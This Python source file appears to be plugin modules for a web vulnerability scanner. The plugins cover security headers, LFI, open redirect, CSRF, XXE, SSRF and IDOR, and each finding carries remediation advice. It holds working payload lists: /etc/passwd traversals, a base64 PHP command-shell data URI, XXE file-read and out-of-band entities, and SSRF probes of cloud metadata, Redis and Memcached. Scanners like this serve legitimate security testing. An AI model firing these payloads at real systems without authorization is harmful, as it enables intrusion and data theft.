"""
Additional Vulnerability Modules:
- Security Headers (A05:2021)
- Local File Inclusion (A01:2021)
- Open Redirect (A01:2021)
- CSRF Detection (A01:2021)
- XXE (A05:2021)
- SSRF (A10:2021)
- IDOR (A01:2021)
"""

import re
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

from core.base_plugin import BasePlugin, Finding
from utils.logger import get_logger

logger = get_logger("modules")


# ═══════════════════════════════════════════════════════════════════════════════
# SECURITY HEADERS MODULE
# ═══════════════════════════════════════════════════════════════════════════════

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "description": "Enforces HTTPS connections",
        "recommended": "max-age=31536000; includeSubDomains",
        "severity": "high",
        "cwe": "CWE-319",
    },
    "Content-Security-Policy": {
        "description": "Prevents XSS and data injection attacks",
        "recommended": "default-src 'self'",
        "severity": "high",
        "cwe": "CWE-79",
    },
    "X-Frame-Options": {
        "description": "Prevents clickjacking attacks",
        "recommended": "DENY or SAMEORIGIN",
        "severity": "medium",
        "cwe": "CWE-1021",
    },
    "X-Content-Type-Options": {
        "description": "Prevents MIME type sniffing",
        "recommended": "nosniff",
        "severity": "medium",
        "cwe": "CWE-116",
    },
    "Referrer-Policy": {
        "description": "Controls referrer information",
        "recommended": "strict-origin-when-cross-origin",
        "severity": "low",
        "cwe": "CWE-200",
    },
    "Permissions-Policy": {
        "description": "Controls browser features/APIs",
        "recommended": "geolocation=(), microphone=(), camera=()",
        "severity": "low",
        "cwe": "CWE-284",
    },
    "X-XSS-Protection": {
        "description": "Legacy XSS filter (deprecated but still checked)",
        "recommended": "0 (use CSP instead)",
        "severity": "info",
        "cwe": "CWE-79",
    },
}

INSECURE_HEADERS = {
    "Server": "Reveals server software version",
    "X-Powered-By": "Reveals technology stack",
    "X-AspNet-Version": "Reveals ASP.NET version",
    "X-AspNetMvc-Version": "Reveals ASP.NET MVC version",
}


class HeadersPlugin(BasePlugin):
    plugin_id = "headers"
    name = "Security Headers"
    description = "Checks HTTP response headers for security misconfigurations"
    owasp_category = "A05:2021"
    mitre_technique = "T1600"

    def run(self, crawl_results: Dict) -> List[Finding]:
        logger.info("Checking security headers")
        # Only check the main target URL
        target = self.config.target_url
        resp = self.session.get(target)
        if not resp:
            return self.findings

        headers = {k.lower(): v for k, v in resp.headers.items()}

        # Check missing security headers
        for header, info in SECURITY_HEADERS.items():
            if header.lower() not in headers:
                self.add_finding(self._make_finding(
                    title=f"Missing Security Header: {header}",
                    severity=info["severity"],
                    description=(
                        f"The '{header}' security header is not present. "
                        f"{info['description']}."
                    ),
                    url=target,
                    method="GET",
                    evidence=f"Header absent. Recommended: {header}: {info['recommended']}",
                    cwe_id=info["cwe"],
                    confidence="high",
                    remediation=f"Add the header: {header}: {info['recommended']}",
                    references=[
                        "https://owasp.org/www-project-secure-headers/",
                        "https://securityheaders.com/",
                    ],
                ))

        # Check information disclosure headers
        for header, description in INSECURE_HEADERS.items():
            if header.lower() in headers:
                self.add_finding(self._make_finding(
                    title=f"Information Disclosure: {header} Header",
                    severity="low",
                    description=(
                        f"The '{header}' header reveals potentially sensitive information. "
                        f"{description}."
                    ),
                    url=target,
                    method="GET",
                    evidence=f"{header}: {headers[header.lower()]}",
                    cwe_id="CWE-200",
                    confidence="high",
                    remediation=f"Remove or mask the '{header}' response header.",
                    references=["https://owasp.org/www-project-secure-headers/"],
                ))

        # Check HTTPS enforcement
        if self.config.target_url.startswith("http://"):
            self.add_finding(self._make_finding(
                title="Site Not Using HTTPS",
                severity="high",
                description="The target URL uses unencrypted HTTP, exposing all data in transit.",
                url=target,
                method="GET",
                cwe_id="CWE-319",
                confidence="high",
                remediation="Configure SSL/TLS and redirect all HTTP traffic to HTTPS.",
                references=["https://letsencrypt.org/"],
            ))

        # Check cookie security
        set_cookie = resp.headers.get("Set-Cookie", "")
        if set_cookie:
            self._check_cookie_security(target, set_cookie)

        return self.findings

    def _check_cookie_security(self, url: str, cookie_header: str):
        if "httponly" not in cookie_header.lower():
            self.add_finding(self._make_finding(
                title="Cookie Missing HttpOnly Flag",
                severity="medium",
                description="A cookie is set without the HttpOnly flag, making it accessible to JavaScript.",
                url=url,
                method="GET",
                evidence=f"Set-Cookie: {cookie_header[:200]}",
                cwe_id="CWE-1004",
                confidence="high",
                remediation="Set the HttpOnly flag on all sensitive cookies.",
                references=["https://owasp.org/www-community/HttpOnly"],
            ))

        if "secure" not in cookie_header.lower():
            self.add_finding(self._make_finding(
                title="Cookie Missing Secure Flag",
                severity="medium",
                description="A cookie is set without the Secure flag, allowing transmission over HTTP.",
                url=url,
                method="GET",
                evidence=f"Set-Cookie: {cookie_header[:200]}",
                cwe_id="CWE-614",
                confidence="high",
                remediation="Set the Secure flag on all session cookies.",
                references=["https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"],
            ))

        if "samesite" not in cookie_header.lower():
            self.add_finding(self._make_finding(
                title="Cookie Missing SameSite Attribute",
                severity="low",
                description="Cookie lacks SameSite attribute, potentially allowing CSRF attacks.",
                url=url,
                method="GET",
                evidence=f"Set-Cookie: {cookie_header[:200]}",
                cwe_id="CWE-1275",
                confidence="high",
                remediation="Add SameSite=Strict or SameSite=Lax to cookie definitions.",
                references=["https://owasp.org/www-community/attacks/csrf"],
            ))


# ═══════════════════════════════════════════════════════════════════════════════
# LOCAL FILE INCLUSION MODULE
# ═══════════════════════════════════════════════════════════════════════════════

LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..%2Fetc%2Fpasswd",
    "..%252Fetc%252Fpasswd",
    "....//etc/passwd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "../../Windows/win.ini",
    "../../../Windows/win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
]

LFI_SUCCESS_PATTERNS = [
    r"root:x:0:0",
    r"root:.*:/bin/",
    r"\[boot loader\]",
    r"\[operating systems\]",
    r"daemon:x:",
    r"nobody:x:",
    r"www-data:x:",
]


class LFIPlugin(BasePlugin):
    plugin_id = "lfi"
    name = "Local File Inclusion"
    description = "Tests URL parameters for path traversal and file inclusion vulnerabilities"
    owasp_category = "A01:2021"
    mitre_technique = "T1083"

    def run(self, crawl_results: Dict) -> List[Finding]:
        logger.info("Starting LFI scan")

        for url, result in crawl_results.items():
            if "?" in url:
                self._test_url_params(url)
            for form in result.forms:
                self._test_form(form)

        return self.findings

    def _test_url_params(self, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # Focus on params that look file-related
        file_related = {k for k in params if any(
            w in k.lower() for w in ["file", "path", "page", "dir", "include", "load", "template", "view"]
        )}

        test_params = file_related or set(params.keys())

        for param in test_params:
            for payload in LFI_PAYLOADS[:8]:
                test_params_copy = dict(params)
                test_params_copy[param] = [payload]
                new_query = urlencode(test_params_copy, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))

                resp = self.session.get(test_url)
                if not resp:
                    continue

                for pattern in LFI_SUCCESS_PATTERNS:
                    if re.search(pattern, resp.text):
                        self.add_finding(self._make_finding(
                            title="Local File Inclusion (Path Traversal)",
                            severity="critical",
                            description=(
                                f"Parameter '{param}' is vulnerable to path traversal/LFI. "
                                f"File contents pattern detected in response."
                            ),
                            url=url,
                            parameter=param,
                            method="GET",
                            payload=payload,
                            evidence=f"Matched pattern: {pattern}",
                            response_snippet=resp.text[:500],
                            cwe_id="CWE-22",
                            cvss_score=9.1,
                            confidence="high",
                            remediation=(
                                "Validate file paths against a whitelist of allowed files. "
                                "Use realpath() or similar to canonicalize paths. "
                                "Chroot the application. Never pass user input directly to file functions."
                            ),
                            references=[
                                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
                                "https://cwe.mitre.org/data/definitions/22.html",
                            ],
                        ))
                        return

    def _test_form(self, form):
        for field in form.fields:
            if field.field_type in ("submit", "button", "hidden"):
                continue
            if not any(w in field.name.lower() for w in ["file", "path", "page", "dir", "include"]):
                continue
            for payload in LFI_PAYLOADS[:5]:
                data = form.to_data()
                data[field.name] = payload
                resp = self.session.post(form.target_url, data=data) if form.method == "POST" else self.session.get(
                    f"{form.target_url}?{urlencode(data)}"
                )
                if resp:
                    for pattern in LFI_SUCCESS_PATTERNS:
                        if re.search(pattern, resp.text):
                            self.add_finding(self._make_finding(
                                title="Local File Inclusion via Form",
                                severity="critical",
                                url=form.url,
                                parameter=field.name,
                                method=form.method,
                                payload=payload,
                                description=f"Form field '{field.name}' is vulnerable to LFI.",
                                evidence=f"Pattern matched: {pattern}",
                                cwe_id="CWE-22",
                                cvss_score=9.1,
                                confidence="high",
                                remediation="Whitelist allowed file paths. Canonicalize with realpath().",
                                references=["https://cwe.mitre.org/data/definitions/22.html"],
                            ))
                            return


# ═══════════════════════════════════════════════════════════════════════════════
# OPEN REDIRECT MODULE
# ═══════════════════════════════════════════════════════════════════════════════

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "//evil.com/%2F..",
    "https:evil.com",
    "/\\evil.com",
    "//google.com@evil.com",
    "javascript:alert(1)",
    "data:text/html,<h1>XSS</h1>",
    "%2F%2Fevil.com",
    "//evil.com-2",
    "https://EVIL.com",
]

REDIRECT_PARAM_NAMES = [
    "redirect", "redirect_to", "redirect_url", "return", "return_url",
    "returnUrl", "returnTo", "next", "url", "goto", "target", "link",
    "forward", "redir", "destination", "dest", "back", "callback",
]


class OpenRedirectPlugin(BasePlugin):
    plugin_id = "open_redirect"
    name = "Open Redirect"
    description = "Detects open redirect vulnerabilities in URL parameters"
    owasp_category = "A01:2021"
    mitre_technique = "T1534"

    def run(self, crawl_results: Dict) -> List[Finding]:
        logger.info("Starting Open Redirect scan")

        for url, result in crawl_results.items():
            if "?" in url:
                self._test_url(url)

        return self.findings

    def _test_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # Focus on redirect-style parameters
        redirect_params = {k for k in params if k.lower() in REDIRECT_PARAM_NAMES}

        for param in redirect_params:
            for payload in REDIRECT_PAYLOADS[:6]:
                test_params = dict(params)
                test_params[param] = [payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))

                resp = self.session.get(test_url, allow_redirects=False)
                if not resp:
                    continue

                # Check for redirect to our payload domain
                if resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.headers.get("Location", "")
                    if "evil.com" in location or location.startswith("//"):
                        self.add_finding(self._make_finding(
                            title=f"Open Redirect — Parameter '{param}'",
                            severity="medium",
                            description=(
                                f"Parameter '{param}' allows redirection to arbitrary external URLs. "
                                f"Attackers can craft phishing URLs under the target domain."
                            ),
                            url=url,
                            parameter=param,
                            method="GET",
                            payload=payload,
                            evidence=f"HTTP {resp.status_code} Location: {location}",
                            cwe_id="CWE-601",
                            cvss_score=6.1,
                            confidence="high",
                            remediation=(
                                "Validate redirect destinations against a whitelist of allowed URLs. "
                                "Reject relative URLs with protocol-relative paths (//). "
                                "Use indirect references instead of putting URLs in parameters."
                            ),
                            references=[
                                "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
                                "https://cwe.mitre.org/data/definitions/601.html",
                            ],
                        ))
                        return


# ═══════════════════════════════════════════════════════════════════════════════
# CSRF DETECTION MODULE
# ═══════════════════════════════════════════════════════════════════════════════

class CSRFPlugin(BasePlugin):
    plugin_id = "csrf"
    name = "CSRF Detection"
    description = "Checks POST forms for missing CSRF tokens and SameSite cookie attributes"
    owasp_category = "A01:2021"
    mitre_technique = "T1185"

    CSRF_TOKEN_NAMES = {
        "csrf", "csrftoken", "_token", "authenticity_token", "csrf_token",
        "_csrf", "xsrf_token", "nonce", "form_token", "__requestverificationtoken",
    }

    def run(self, crawl_results: Dict) -> List[Finding]:
        logger.info("Starting CSRF scan")

        checked = set()
        for url, result in crawl_results.items():
            for form in result.forms:
                if form.method != "POST":
                    continue

                key = (form.target_url, frozenset(f.name for f in form.fields))
                if key in checked:
                    continue
                checked.add(key)

                self._check_form_csrf(form)

        return self.findings

    def _check_form_csrf(self, form):
        """Check if form has CSRF protection."""
        field_names = {f.name.lower() for f in form.fields}

        has_csrf_token = any(
            tok in name or name in tok
            for name in field_names
            for tok in self.CSRF_TOKEN_NAMES
        )

        if not has_csrf_token:
            self.add_finding(self._make_finding(
                title="CSRF — POST Form Missing Anti-CSRF Token",
                severity="medium",
                description=(
                    f"The POST form at {form.target_url} does not appear to contain "
                    f"an anti-CSRF token. This may allow cross-site request forgery attacks."
                ),
                url=form.url,
                method="POST",
                evidence=(
                    f"Form action: {form.target_url}\n"
                    f"Fields: {', '.join(f.name for f in form.fields)}"
                ),
                cwe_id="CWE-352",
                cvss_score=6.5,
                confidence="medium",
                false_positive_risk="medium",
                remediation=(
                    "Implement CSRF tokens: generate a cryptographically random token per session/form. "
                    "Verify the token server-side on all state-changing requests. "
                    "Also set SameSite=Strict/Lax on session cookies as defense-in-depth."
                ),
                references=[
                    "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
                    "https://cwe.mitre.org/data/definitions/352.html",
                ],
            ))


# ═══════════════════════════════════════════════════════════════════════════════
# XXE MODULE
# ═══════════════════════════════════════════════════════════════════════════════

XXE_PAYLOADS = [
    # Basic XXE
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""",
    # Blind XXE via HTTP
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://COLLABORATOR/xxe">]><root>&xxe;</root>""",
    # Parameter entity
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root/>""",
]

XXE_SUCCESS_PATTERNS = [
    r"root:x:0:0",
    r"daemon:x:",
    r"\[boot loader\]",
]


class XXEPlugin(BasePlugin):
    plugin_id = "xxe"
    name = "XML External Entity"
    description = "Tests XML input fields and endpoints for XXE vulnerabilities"
    owasp_category = "A05:2021"
    mitre_technique = "T1190"

    def run(self, crawl_results: Dict) -> List[Finding]:
        logger.info("Starting XXE scan")

        for url, result in crawl_results.items():
            for form in result.forms:
                if "xml" in form.enctype.lower():
                    self._test_xml_form(form)

            resp = self.session.get(url)
            if resp and "application/xml" in resp.headers.get("Content-Type", ""):
                self._test_xml_endpoint(url)

        return self.findings

    def _test_xml_endpoint(self, url: str):
        for payload in XXE_PAYLOADS[:1]:
            resp = self.session.post(
                url,
                data=payload,
                headers={"Content-Type": "application/xml"},
            )
            if resp:
                for pattern in XXE_SUCCESS_PATTERNS:
                    if re.search(pattern, resp.text):
                        self.add_finding(self._make_finding(
                            title="XML External Entity (XXE) Injection",
                            severity="critical",
                            description="The XML endpoint processes external entities, enabling file read.",
                            url=url,
                            method="POST",
                            payload=payload[:200],
                            evidence=f"Pattern matched: {pattern}",
                            cwe_id="CWE-611",
                            cvss_score=9.1,
                            confidence="high",
                            remediation=(
                                "Disable external entity processing in your XML parser. "
                                "Use JAXP: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). "
                                "Use libxml2: xmlCtxtUseOptions(ctxt, XML_PARSE_NOENT | XML_PARSE_DTDLOAD). "
                                "Switch to JSON where possible."
                            ),
                            references=[
                                "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                                "https://cwe.mitre.org/data/definitions/611.html",
                            ],
                        ))

    def _test_xml_form(self, form):
        pass  # Extend: inject XXE into XML form submissions


# ═══════════════════════════════════════════════════════════════════════════════
# SSRF MODULE
# ═══════════════════════════════════════════════════════════════════════════════

SSRF_PAYLOADS = [
    "http://localhost/",
    "http://127.0.0.1/",
    "http://169.254.169.254/",             # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",    # GCP metadata
    "http://0.0.0.0/",
    "http://[::1]/",
    "file:///etc/passwd",
    "dict://localhost:11211/",             # Memcached
    "gopher://localhost:6379/_PING",       # Redis
    "http://10.0.0.1/",
    "http://192.168.0.1/",
]

SSRF_PARAM_NAMES = [
    "url", "uri", "link", "src", "source", "fetch", "load",
    "host", "endpoint", "target", "proxy", "webhook", "callback",
    "path", "dest", "destination", "image", "api", "service",
]

SSRF_INDICATORS = [
    r"169\.254\.169\.254",
    r"root:x:0:0",
    r"ami-id",
    r"instance-id",
    r"metadata",
    r"internal server error",
    r"connection refused",
    r"timeout",
    r"network is unreachable",
]


class SSRFPlugin(BasePlugin):
    plugin_id = "ssrf"
    name = "Server-Side Request Forgery"
    description = "Detects SSRF vulnerabilities by testing URL-accepting parameters"
    owasp_category = "A10:2021"
    mitre_technique = "T1090"

    def run(self, crawl_results: Dict) -> List[Finding]:
        logger.info("Starting SSRF scan")

        for url, result in crawl_results.items():
            if "?" in url:
                self._test_url_params(url)

        return self.findings

    def _test_url_params(self, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        ssrf_params = {k for k in params if k.lower() in SSRF_PARAM_NAMES}

        for param in ssrf_params:
            for payload in SSRF_PAYLOADS[:6]:
                test_params = dict(params)
                test_params[param] = [payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))

                resp = self.session.get(test_url)
                if not resp:
                    continue

                for indicator in SSRF_INDICATORS:
                    if re.search(indicator, resp.text, re.IGNORECASE):
                        self.add_finding(self._make_finding(
                            title=f"Server-Side Request Forgery (SSRF) — '{param}'",
                            severity="high",
                            description=(
                                f"Parameter '{param}' may be vulnerable to SSRF. "
                                f"The server appears to be making requests to attacker-controlled URLs."
                            ),
                            url=url,
                            parameter=param,
                            method="GET",
                            payload=payload,
                            evidence=f"Response indicator matched: {indicator}",
                            cwe_id="CWE-918",
                            cvss_score=8.6,
                            confidence="medium",
                            remediation=(
                                "Validate and whitelist allowed URL destinations. "
                                "Disable unused URL schemes (file://, gopher://, dict://). "
                                "Use an allowlist of IP ranges. "
                                "Block requests to internal/metadata IP ranges at the network level."
                            ),
                            references=[
                                "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
                                "https://cwe.mitre.org/data/definitions/918.html",
                            ],
                        ))
                        return


# ═══════════════════════════════════════════════════════════════════════════════
# IDOR MODULE
# ═══════════════════════════════════════════════════════════════════════════════

IDOR_PARAM_NAMES = [
    "id", "user_id", "userId", "account", "account_id", "record",
    "order", "order_id", "orderId", "item", "item_id", "pid",
    "uid", "file", "doc", "document", "num", "number", "ref",
]


class IDORPlugin(BasePlugin):
    plugin_id = "idor"
    name = "Insecure Direct Object Reference"
    description = "Detects potential IDOR by testing numeric ID parameters for horizontal access"
    owasp_category = "A01:2021"
    mitre_technique = "T1078"

    def run(self, crawl_results: Dict) -> List[Finding]:
        logger.info("Starting IDOR scan")

        for url, result in crawl_results.items():
            if "?" in url:
                self._test_url(url)

        return self.findings

    def _test_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        for param in params:
            if param.lower() not in IDOR_PARAM_NAMES:
                continue

            original_value = params[param][0]
            if not original_value.isdigit():
                continue

            # Get baseline
            baseline = self.session.get(url)
            if not baseline or baseline.status_code not in (200, 201):
                continue

            # Try adjacent IDs
            test_id = str(int(original_value) + 1)
            test_params = dict(params)
            test_params[param] = [test_id]
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))

            test_resp = self.session.get(test_url)
            if not test_resp:
                continue

            # Potential IDOR: both IDs return 200 with similar content length
            if test_resp.status_code == 200:
                bl = len(baseline.content)
                tl = len(test_resp.content)
                if bl > 100 and tl > 100 and abs(bl - tl) / max(bl, tl) < 0.5:
                    self.add_finding(self._make_finding(
                        title=f"Potential IDOR — Parameter '{param}'",
                        severity="medium",
                        description=(
                            f"Parameter '{param}' uses predictable numeric IDs. "
                            f"Accessing ID {original_value} and {test_id} both returned HTTP 200, "
                            f"suggesting a potential IDOR vulnerability requiring manual verification."
                        ),
                        url=url,
                        parameter=param,
                        method="GET",
                        payload=f"{original_value} → {test_id}",
                        evidence=(
                            f"Original ID ({original_value}): HTTP 200 ({bl}b)\n"
                            f"Test ID ({test_id}): HTTP 200 ({tl}b)"
                        ),
                        cwe_id="CWE-639",
                        cvss_score=6.5,
                        confidence="low",
                        false_positive_risk="high",
                        remediation=(
                            "Implement server-side authorization checks for every object access. "
                            "Use non-predictable UUIDs/GUIDs instead of sequential IDs. "
                            "Verify user owns or has permission to access each requested resource."
                        ),
                        references=[
                            "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html",
                            "https://cwe.mitre.org/data/definitions/639.html",
                        ],
                    ))
